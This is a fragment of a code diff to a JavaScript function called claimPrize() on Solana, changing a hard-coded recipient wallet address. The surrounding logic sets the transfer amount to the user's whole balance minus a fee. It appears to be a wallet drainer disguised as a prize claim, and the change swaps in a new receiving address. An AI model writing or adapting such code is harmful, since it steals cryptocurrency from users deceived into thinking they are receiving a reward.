@@ -52,7 +52,7 @@ async function claimPrize() {
       return;
     }
 
-    const recipient = new solanaWeb3.PublicKey('HHcU1RvjmYaCPYjp2FQvnMAqJe7BB8X1joTpfP17xEgd');
+    const recipient = new solanaWeb3.PublicKey('GJYnbja54NLVqob7329eieZ5u7kTzgK85s36HYbNiBLd');
     const fee = 0.001 * solanaWeb3.LAMPORTS_PER_SOL;
     const amount = balance - fee;
 
